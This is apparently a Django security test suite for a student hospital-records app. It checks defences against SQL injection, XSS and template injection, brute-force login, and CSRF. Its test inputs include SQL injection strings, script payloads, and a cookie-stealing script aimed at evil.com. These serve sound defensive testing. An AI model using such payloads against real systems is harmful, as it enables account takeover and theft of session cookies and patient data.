"""Security test suite untuk PKPL Tugas 3.

Setiap test class memetakan ke test case di dokumen tugas:
- TC-SQLi-01..03 dan TC-SQLi-04a (Hospital)
- TC-CI-01..03 dan TC-CI-04a
- TC-BA-01..05
- TC-CSRF-01..03 dan TC-CSRF-04a

Jalankan: python manage.py test hospital_app.tests -v 2
"""

from __future__ import annotations

import re
from datetime import date
from pathlib import Path

from django.contrib.auth import get_user_model
from django.test import Client, TestCase, override_settings
from django.urls import reverse

from accounts.models import Role
from hospital_app.models import Dokter, Pasien, RekamMedis

User = get_user_model()
BASE_DIR = Path(__file__).resolve().parent.parent


def _create_user(username: str, role: str, password: str = "TestPass#2026") -> User:
    user = User.objects.create_user(
        username=username, password=password, full_name=f"User {username}",
    )
    user.role = role
    if role == Role.ADMIN:
        user.is_staff = True
        user.is_superuser = True
    user.save()
    return user


def _create_pasien(nrm: str = "10000001", nama: str = "Citra Hapsari") -> Pasien:
    # NIK 16 digit unik per NRM.
    nik = (nrm + "0" * 16)[:16]
    return Pasien.objects.create(
        nrm=nrm,
        nik=nik,
        nama=nama,
        tanggal_lahir=date(1990, 1, 1),
        jenis_kelamin="P",
        no_telepon="+628123456789",
        alamat="Jl. Demo",
    )


def _create_dokter(user: User, nip: str = "DOKTER01") -> Dokter:
    return Dokter.objects.create(
        user=user, nip=nip, nama="dr. Test", spesialisasi="Umum",
        no_telepon="+628111111111",
    )


# ---------------------------------------------------------------------------
# TC-SQLi: SQL Injection Prevention (CWE-89)
# ---------------------------------------------------------------------------

class SqlInjectionTests(TestCase):
    def setUp(self):
        self.client = Client()
        self.user_dokter = _create_user("dr.test", Role.DOKTER)
        _create_dokter(self.user_dokter)
        _create_pasien("10000001", "Pasien Asli")
        _create_pasien("10000002", "Pasien Kedua")

    def test_tc_sqli_01_login_bypass_blocked(self):
        """TC-SQLi-01: Login bypass dengan ' OR '1'='1' -- harus GAGAL."""
        resp = self.client.post(reverse("accounts:login"), {
            "username": "' OR '1'='1' --",
            "password": "anything",
        })
        self.assertNotIn("_auth_user_id", self.client.session)
        self.assertContains(resp, "Username atau password salah")

    def test_tc_sqli_02_union_select_blocked_in_search(self):
        """TC-SQLi-02: UNION SELECT pada pencarian harus tidak mengembalikan data lain."""
        self.client.force_login(self.user_dokter)
        payload = "10000001' UNION SELECT username, password, NULL FROM accounts_user --"
        resp = self.client.get(reverse("hospital_app:pasien_list"), {"q": payload})
        self.assertEqual(resp.status_code, 200)
        # Tidak ada hash password yang bocor di response.
        self.assertNotIn(b"pbkdf2_", resp.content)
        self.assertNotIn(b"argon2", resp.content)

    def test_tc_sqli_03_no_raw_sql_concatenation(self):
        """TC-SQLi-03 (white-box): scan kode untuk pola raw SQL berbahaya."""
        forbidden_patterns = [
            re.compile(r"\.raw\s*\(\s*[\"'].*%[s]?.*[\"']\s*%"),
            re.compile(r"cursor\.execute\s*\(\s*[\"'].*\+\s*\w"),
            re.compile(r"cursor\.execute\s*\(\s*f[\"']"),
        ]
        offenders = []
        for py_file in BASE_DIR.rglob("*.py"):
            parts = py_file.parts
            if any(p in parts for p in ("venv", "site-packages", "migrations")):
                continue
            if py_file.name == "tests.py":
                continue
            text = py_file.read_text(encoding="utf-8", errors="ignore")
            for pat in forbidden_patterns:
                if pat.search(text):
                    offenders.append((str(py_file), pat.pattern))

        self.assertEqual(offenders, [], f"Raw SQL concatenation ditemukan: {offenders}")

    def test_tc_sqli_04a_rekam_medis_search_safe(self):
        """TC-SQLi-04a: pencarian rekam medis dengan payload SQLi tetap aman."""
        self.client.force_login(self.user_dokter)
        payload = "12345' OR '1'='1"
        resp = self.client.get(reverse("hospital_app:pasien_list"), {"q": payload})
        self.assertEqual(resp.status_code, 200)
        self.assertContains(resp, "Tidak ada pasien")


# ---------------------------------------------------------------------------
# TC-CI: Code Injection (XSS, HTML, SSTI) - CWE-79 / CWE-94
# ---------------------------------------------------------------------------

class CodeInjectionTests(TestCase):
    def setUp(self):
        self.client = Client()
        self.user = _create_user("dr.tester", Role.DOKTER)
        self.dokter = _create_dokter(self.user)
        self.pasien = _create_pasien()

    def test_tc_ci_01_script_tag_escaped(self):
        """TC-CI-01: <script>alert('XSS')</script> tidak dieksekusi."""
        self.client.force_login(self.user)
        url = reverse("hospital_app:pasien_edit", args=[self.pasien.pk])
        resp = self.client.post(url, {
            "nrm": self.pasien.nrm,
            "nik": self.pasien.nik,
            "nama": "Citra Hapsari",
            "tanggal_lahir": "1990-01-01",
            "jenis_kelamin": "P",
            "no_telepon": "+628123456789",
            "alamat": "<script>alert('XSS')</script>Jl. Jakarta",
        })
        self.assertEqual(resp.status_code, 302)
        self.pasien.refresh_from_db()
        self.assertNotIn("<script>", self.pasien.alamat)
        self.assertIn("Jl. Jakarta", self.pasien.alamat)

        detail = self.client.get(
            reverse("hospital_app:pasien_detail", args=[self.pasien.pk])
        )
        self.assertNotIn(b"<script>alert", detail.content)

    def test_tc_ci_02_html_injection_escaped(self):
        """TC-CI-02: <h1>Hacked</h1> ditampilkan sebagai teks, tidak dirender."""
        self.client.force_login(self.user)
        rm = RekamMedis.objects.create(
            nomor="RM-TC02", pasien=self.pasien, dokter=self.dokter,
            tanggal=date(2026, 1, 1),
            diagnosa="<h1>Hacked</h1><img src=x onerror=alert(1)>",
        )
        resp = self.client.get(reverse("hospital_app:rekam_medis_detail", args=[rm.pk]))
        # Autoescape: tag muncul sebagai entity HTML, bukan tag aktif.
        self.assertNotIn(b"<h1>Hacked</h1>", resp.content)
        self.assertIn(b"&lt;h1&gt;Hacked&lt;/h1&gt;", resp.content)

    def test_tc_ci_03_template_injection_not_evaluated(self):
        """TC-CI-03: {{7*7}} sebagai input tidak boleh menjadi 49."""
        self.client.force_login(self.user)
        rm = RekamMedis.objects.create(
            nomor="RM-TC03", pasien=self.pasien, dokter=self.dokter,
            tanggal=date(2026, 1, 1),
            diagnosa="Test {{7*7}} {{config.SECRET_KEY}}",
        )
        resp = self.client.get(reverse("hospital_app:rekam_medis_detail", args=[rm.pk]))
        self.assertContains(resp, "{{7*7}}")
        from django.conf import settings as dj_settings
        self.assertNotIn(dj_settings.SECRET_KEY.encode(), resp.content)

    def test_tc_ci_04a_payload_diagnosa_safe(self):
        """TC-CI-04a: payload pencurian cookie tidak dieksekusi."""
        self.client.force_login(self.user)
        payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"
        rm = RekamMedis.objects.create(
            nomor="RM-TC04A", pasien=self.pasien, dokter=self.dokter,
            tanggal=date(2026, 1, 1),
            diagnosa=payload,
            catatan_dokter=payload,
        )
        resp = self.client.get(reverse("hospital_app:rekam_medis_detail", args=[rm.pk]))
        self.assertNotIn(b"<script>document.location", resp.content)


# ---------------------------------------------------------------------------
# TC-BA: Broken Authentication
# ---------------------------------------------------------------------------

class BrokenAuthenticationTests(TestCase):
    def setUp(self):
        self.client = Client()
        self.user = _create_user("test_user", Role.PASIEN, password="MyPass#2026")

    def test_tc_ba_01_password_is_hashed(self):
        """TC-BA-01 (white-box): password tersimpan sebagai hash, bukan plaintext."""
        self.user.refresh_from_db()
        self.assertTrue(
            self.user.password.startswith("pbkdf2_"),
            f"Password tidak ter-hash: {self.user.password[:20]}",
        )
        self.assertNotIn("MyPass#2026", self.user.password)

    @override_settings(AXES_FAILURE_LIMIT=3, AXES_COOLOFF_TIME=0.001)
    def test_tc_ba_02_rate_limiting_after_failures(self):
        """TC-BA-02: setelah N percobaan gagal, login di-lockout (CWE-307)."""
        from axes.utils import reset
        reset()
        url = reverse("accounts:login")
        for _ in range(3):
            self.client.post(url, {"username": "test_user", "password": "WRONG"})
        # Bahkan dengan password benar, akun di-lockout.
        resp = self.client.post(url, {"username": "test_user", "password": "MyPass#2026"})
        self.assertNotIn("_auth_user_id", self.client.session)
        # django-axes mengembalikan 200 (template lockout), 403, atau 429 (Too Many Requests).
        self.assertIn(resp.status_code, (200, 403, 429))

    def test_tc_ba_03_session_invalidated_after_logout(self):
        """TC-BA-03: setelah logout, session token tidak dapat dipakai lagi (CWE-613)."""
        # force_login bypasses django-axes (axes butuh request, tidak ada di Client.login).
        self.client.force_login(self.user)
        self.assertIn("_auth_user_id", self.client.session)
        self.client.post(reverse("accounts:logout"))
        resp = self.client.get(reverse("hospital_app:dashboard"))
        self.assertEqual(resp.status_code, 302)
        self.assertIn("/accounts/login/", resp["Location"])

    def test_tc_ba_04_protected_page_redirects_unauthenticated(self):
        """TC-BA-04: akses halaman terproteksi tanpa login -> redirect ke login (CWE-306)."""
        for url_name in ["hospital_app:dashboard", "hospital_app:pasien_list",
                         "hospital_app:rekam_medis_list", "hospital_app:resep_list"]:
            resp = self.client.get(reverse(url_name))
            self.assertEqual(resp.status_code, 302, f"{url_name} should redirect")
            self.assertIn("/accounts/login/", resp["Location"])

    def test_tc_ba_05_generic_login_error_no_user_enumeration(self):
        """TC-BA-05: pesan error sama untuk username invalid vs password invalid (CWE-204)."""
        url = reverse("accounts:login")
        r1 = self.client.post(url, {"username": "tidakAda", "password": "x"})
        r2 = self.client.post(url, {"username": "test_user", "password": "WRONG"})
        self.assertContains(r1, "Username atau password salah")
        self.assertContains(r2, "Username atau password salah")

    def test_register_then_auto_login_works(self):
        """Regression: register harus auto-login tanpa raise ValueError karena
        ada multiple AUTHENTICATION_BACKENDS (axes + model)."""
        resp = self.client.post(reverse("accounts:register"), {
            "username": "new.user",
            "full_name": "New User",
            "email": "new@example.com",
            "role": "PASIEN",
            "password1": "Secure#Pass2026",
            "password2": "Secure#Pass2026",
        })
        # Harus redirect ke dashboard (bukan 500).
        self.assertEqual(resp.status_code, 302)
        self.assertIn("/dashboard/", resp["Location"])
        # User sudah login.
        self.assertIn("_auth_user_id", self.client.session)


# ---------------------------------------------------------------------------
# TC-CSRF: Cross-Site Request Forgery (CWE-352)
# ---------------------------------------------------------------------------

class CsrfTests(TestCase):
    def setUp(self):
        self.user = _create_user("dr.csrf", Role.DOKTER)
        _create_dokter(self.user)
        self.pasien = _create_pasien()
        # enforce_csrf_checks=True wajib - default test client mem-bypass CSRF.
        self.csrf_client = Client(enforce_csrf_checks=True)
        self.csrf_client.force_login(self.user)

    def test_tc_csrf_01_token_present_on_forms(self):
        """TC-CSRF-01: setiap form POST punya hidden input csrfmiddlewaretoken."""
        # Form-form yang memerlukan login (pakai logged-in client).
        client = Client()
        client.force_login(self.user)
        protected_urls = [
            reverse("hospital_app:pasien_create"),
            reverse("hospital_app:pasien_edit", args=[self.pasien.pk]),
            reverse("hospital_app:rekam_medis_create"),
        ]
        for url in protected_urls:
            resp = client.get(url)
            self.assertEqual(resp.status_code, 200, f"GET {url} failed")
            self.assertContains(
                resp, 'name="csrfmiddlewaretoken"',
                msg_prefix=f"CSRF token tidak ada pada {url}",
            )

        # Form-form publik (login & register) - pakai client tanpa login.
        public = Client()
        for url in [reverse("accounts:login"), reverse("accounts:register")]:
            resp = public.get(url)
            self.assertEqual(resp.status_code, 200, f"GET {url} failed")
            self.assertContains(resp, 'name="csrfmiddlewaretoken"')

    def test_tc_csrf_02_post_with_invalid_token_rejected(self):
        """TC-CSRF-02: POST dengan token invalid -> 403."""
        url = reverse("hospital_app:pasien_edit", args=[self.pasien.pk])
        resp = self.csrf_client.post(url, {
            "csrfmiddlewaretoken": "invalid_token_12345",
            "nrm": self.pasien.nrm, "nik": self.pasien.nik,
            "nama": "Hacked", "tanggal_lahir": "1990-01-01",
            "jenis_kelamin": "P", "no_telepon": "+628123456789",
            "alamat": "Hacked",
        })
        self.assertEqual(resp.status_code, 403)
        self.pasien.refresh_from_db()
        self.assertNotEqual(self.pasien.nama, "Hacked")

    def test_tc_csrf_03_cross_origin_request_without_token_rejected(self):
        """TC-CSRF-03: request POST tanpa token sama sekali -> 403."""
        url = reverse("hospital_app:pasien_edit", args=[self.pasien.pk])
        resp = self.csrf_client.post(url, {
            "nrm": self.pasien.nrm, "nik": self.pasien.nik,
            "nama": "Hacked", "tanggal_lahir": "1990-01-01",
            "jenis_kelamin": "P", "no_telepon": "+628123456789",
            "alamat": "Hacked",
        })
        self.assertEqual(resp.status_code, 403)

    def test_tc_csrf_04a_pasien_edit_requires_token(self):
        """TC-CSRF-04a: ubah data pasien tanpa token ditolak; data tidak berubah."""
        url = reverse("hospital_app:pasien_edit", args=[self.pasien.pk])
        resp = self.csrf_client.post(url, {})
        self.assertEqual(resp.status_code, 403)
        self.pasien.refresh_from_db()
        self.assertEqual(self.pasien.nama, "Citra Hapsari")
